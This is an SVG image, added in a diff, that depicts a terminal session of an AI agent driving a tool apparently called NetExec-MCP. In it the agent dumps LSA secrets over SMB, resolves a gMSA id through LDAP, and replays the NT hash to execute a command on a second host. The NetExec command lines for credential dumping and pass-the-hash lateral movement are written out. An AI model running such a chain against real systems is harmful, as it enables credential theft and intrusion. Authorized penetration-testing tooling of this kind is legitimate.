@@ -1,0 +1,59 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="872" height="986" viewBox="0 0 872 986" font-family="ui-monospace,SFMono-Regular,Menlo,Consolas,'DejaVu Sans Mono',monospace" role="img" aria-label="Terminal session: NetExec-MCP resolving a plain-English request into the gMSA credential chain across SMB, LDAP and SMB in full mode.">
+<clipPath id="term"><rect x="16" y="16" width="840.0" height="954.0" rx="10"/></clipPath>
+<rect x="16" y="16" width="840.0" height="954.0" rx="10" fill="#0d1117"/>
+<g clip-path="url(#term)">
+<rect x="16" y="16" width="840.0" height="36" fill="#161b22"/>
+<line x1="16" y1="52" x2="856.0" y2="52" stroke="#21262d" stroke-width="1"/>
+<circle cx="36" cy="34.0" r="5" fill="#f85149"/><circle cx="54" cy="34.0" r="5" fill="#e3b341"/><circle cx="72" cy="34.0" r="5" fill="#56d364"/><text x="90" y="38.0" font-size="11" fill="#8b949e">netexec-mcp — NXC_MODE=<tspan fill="#e3b341">full</tspan></text>
+<g font-size="13" fill="#c9d1d9">
+<text x="34.0" y="82.0" xml:space="preserve"><tspan fill="#d2a8ff">you</tspan> <tspan fill="#6e7681">❯</tspan> <tspan fill="#e6edf3">dump creds off 10.0.0.12 and see if anything pivots me further in</tspan></text>
+<line x1="41.0" y1="96.0" x2="41.0" y2="139.0" stroke="#6e56a8" stroke-width="2" stroke-dasharray="4 3"/>
+<text x="56.0" y="110.0" font-size="11" fill="#8b7cc4">agent thinking</text>
+<text x="56.0" y="132.0" xml:space="preserve">start with an LSA dump on the backup host — cheapest way to see what's cached.</text>
+<rect x="40.0" y="150.0" width="798.0" height="197.0" fill="#12151c"/>
+<rect x="40.0" y="150.0" width="2" height="197.0" fill="#8957e5"/>
+<rect x="54.0" y="152.0" width="137.4" height="16" rx="4" fill="#21262d" stroke="#30363d" stroke-width="1"/>
+<text x="61.0" y="165.0" font-size="11" fill="#d2a8ff">nxc-mcp · tool call</text>
+<text x="56.0" y="186.0" xml:space="preserve"><tspan fill="#6e7681">find   nxc_find_tool("dump lsa secrets")  →  smb_lsa</tspan></text>
+<text x="56.0" y="208.0" xml:space="preserve"><tspan fill="#6e7681">gate   scope 10.0.0.0/24 </tspan><tspan fill="#56d364">ok</tspan><tspan fill="#6e7681">   mode full </tspan><tspan fill="#56d364">ok</tspan><tspan fill="#6e7681">   argv no-shell </tspan><tspan fill="#56d364">ok</tspan><tspan fill="#6e7681">   audit </tspan><tspan fill="#e3b341">logged</tspan></text>
+<text x="56.0" y="230.0" xml:space="preserve"><tspan fill="#d2a8ff">spawn</tspan><tspan fill="#e6edf3">  nxc smb 10.0.0.12 -u svc_backup -p '•••••••' --lsa</tspan></text>
+<text x="56.0" y="274.0" xml:space="preserve"><tspan fill="#58a6ff">SMB</tspan>   10.0.0.12   445  DC01   <tspan fill="#56d364">[+]</tspan> corp.local\svc_backup:••••••• <tspan fill="#d2a8ff">(Pwn3d!)</tspan></text>
+<text x="56.0" y="296.0" xml:space="preserve"><tspan fill="#58a6ff">SMB</tspan>   10.0.0.12   445  DC01   <tspan fill="#56d364">[+]</tspan> $MACHINE.ACC  aad3b4…:1a59f2…</text>
+<text x="56.0" y="318.0" xml:space="preserve"><tspan fill="#58a6ff">SMB</tspan>   10.0.0.12   445  DC01   <tspan fill="#56d364">[+]</tspan> gmsa_id <tspan fill="#e3b341">7e1c9a2f</tspan>  ntlm aad3b4…:<tspan fill="#39c5cf">8846f7…</tspan>  <tspan fill="#6e7681">← readable, unresolved</tspan></text>
+<text x="56.0" y="340.0" xml:space="preserve"><tspan fill="#6e7681">exit   0 · 1 host · 2.3s</tspan></text>
+<line x1="41.0" y1="358.0" x2="41.0" y2="401.0" stroke="#6e56a8" stroke-width="2" stroke-dasharray="4 3"/>
+<text x="56.0" y="372.0" font-size="11" fill="#8b7cc4">agent thinking</text>
+<text x="56.0" y="394.0" xml:space="preserve">that gMSA hash is inert until I map the id to an account — pivot to LDAP to resolve it.</text>
+<rect x="40.0" y="412.0" width="798.0" height="153.0" fill="#12151c"/>
+<rect x="40.0" y="412.0" width="2" height="153.0" fill="#8957e5"/>
+<rect x="54.0" y="414.0" width="137.4" height="16" rx="4" fill="#21262d" stroke="#30363d" stroke-width="1"/>
+<text x="61.0" y="427.0" font-size="11" fill="#d2a8ff">nxc-mcp · tool call</text>
+<text x="56.0" y="448.0" xml:space="preserve"><tspan fill="#6e7681">find   nxc_find_tool("resolve gmsa id")  →  ldap_gmsa_convert_id</tspan></text>
+<text x="56.0" y="470.0" xml:space="preserve"><tspan fill="#6e7681">gate   scope 10.0.0.0/24 </tspan><tspan fill="#56d364">ok</tspan><tspan fill="#6e7681">   mode full </tspan><tspan fill="#56d364">ok</tspan><tspan fill="#6e7681">   audit </tspan><tspan fill="#e3b341">logged</tspan></text>
+<text x="56.0" y="492.0" xml:space="preserve"><tspan fill="#d2a8ff">spawn</tspan><tspan fill="#e6edf3">  nxc ldap 10.0.0.12 -u svc_backup -p '•••••••' -M gmsa-convert-id -o ID=</tspan><tspan fill="#e3b341">7e1c9a2f</tspan></text>
+<text x="56.0" y="536.0" xml:space="preserve"><tspan fill="#58a6ff">LDAP</tspan>  10.0.0.12   389  DC01   <tspan fill="#56d364">[+]</tspan> <tspan fill="#e3b341">7e1c9a2f</tspan>  →  <tspan fill="#d2a8ff">gmsa-robin$</tspan></text>
+<text x="56.0" y="558.0" xml:space="preserve"><tspan fill="#6e7681">exit   0 · 1 host · 0.8s</tspan></text>
+<line x1="41.0" y1="576.0" x2="41.0" y2="619.0" stroke="#6e56a8" stroke-width="2" stroke-dasharray="4 3"/>
+<text x="56.0" y="590.0" font-size="11" fill="#8b7cc4">agent thinking</text>
+<text x="56.0" y="612.0" xml:space="preserve">resolved to <tspan fill="#d2a8ff">gmsa-robin$</tspan>. now replay that NT hash back over SMB, with exec.</text>
+<rect x="40.0" y="630.0" width="798.0" height="197.0" fill="#12151c"/>
+<rect x="40.0" y="630.0" width="2" height="197.0" fill="#8957e5"/>
+<rect x="54.0" y="632.0" width="137.4" height="16" rx="4" fill="#21262d" stroke="#30363d" stroke-width="1"/>
+<text x="61.0" y="645.0" font-size="11" fill="#d2a8ff">nxc-mcp · tool call</text>
+<text x="56.0" y="666.0" xml:space="preserve"><tspan fill="#6e7681">find   nxc_find_tool("run a command over smb")  →  smb_exec</tspan></text>
+<text x="56.0" y="688.0" xml:space="preserve"><tspan fill="#6e7681">gate   scope 10.0.0.0/24 </tspan><tspan fill="#56d364">ok</tspan><tspan fill="#6e7681">   mode full </tspan><tspan fill="#56d364">ok</tspan><tspan fill="#6e7681"> </tspan><tspan fill="#e3b341">(exec unlocked)</tspan><tspan fill="#6e7681">   audit </tspan><tspan fill="#e3b341">logged</tspan></text>
+<text x="56.0" y="710.0" xml:space="preserve"><tspan fill="#d2a8ff">spawn</tspan><tspan fill="#e6edf3">  nxc smb 10.0.0.24 -u '</tspan><tspan fill="#d2a8ff">gmsa-robin$</tspan><tspan fill="#e6edf3">' -H aad3b4…:</tspan><tspan fill="#39c5cf">8846f7…</tspan><tspan fill="#e6edf3"> -x whoami</tspan></text>
+<text x="56.0" y="754.0" xml:space="preserve"><tspan fill="#58a6ff">SMB</tspan>   10.0.0.24   445  WS01   <tspan fill="#56d364">[+]</tspan> corp.local\<tspan fill="#d2a8ff">gmsa-robin$</tspan> <tspan fill="#d2a8ff">(Pwn3d!)</tspan></text>
+<text x="56.0" y="776.0" xml:space="preserve"><tspan fill="#58a6ff">SMB</tspan>   10.0.0.24   445  WS01   <tspan fill="#56d364">[+]</tspan> executed 'whoami'</text>
+<text x="56.0" y="798.0" xml:space="preserve"><tspan fill="#58a6ff">SMB</tspan>   10.0.0.24   445  WS01   corp\gmsa-robin$</text>
+<text x="56.0" y="820.0" xml:space="preserve"><tspan fill="#6e7681">exit   0 · 1 host · 3.1s</tspan></text>
+<line x1="41.0" y1="838.0" x2="41.0" y2="903.0" stroke="#6e56a8" stroke-width="2" stroke-dasharray="4 3"/>
+<text x="56.0" y="852.0" font-size="11" fill="#a892d8">agent · reply</text>
+<text x="56.0" y="874.0" xml:space="preserve"><tspan fill="#e6edf3">chained it: svc_backup → LSA → </tspan><tspan fill="#e3b341">7e1c9a2f</tspan><tspan fill="#e6edf3"> → </tspan><tspan fill="#d2a8ff">gmsa-robin$</tspan><tspan fill="#e6edf3"> → code exec on WS01.</tspan></text>
+<text x="56.0" y="896.0" xml:space="preserve">three protocols, one prompt. every call is in the JSONL audit log.</text>
+<text x="34.0" y="922.0" xml:space="preserve"><tspan fill="#d2a8ff">you</tspan> <tspan fill="#6e7681">❯</tspan> <tspan fill="#56d364">█</tspan></text>
+<line x1="34.0" y1="937.0" x2="838.0" y2="937.0" stroke="#21262d" stroke-width="1"/>
+<text x="34.0" y="952.0" xml:space="preserve"><tspan fill="#6e7681">smb → ldap → smb  ·  one prompt  ·  3 tool calls, fully audited  ·  mode full</tspan></text>
+</g></g>
+<rect x="16" y="16" width="840.0" height="954.0" rx="10" fill="none" stroke="#30363d" stroke-width="1"/>
+</svg>
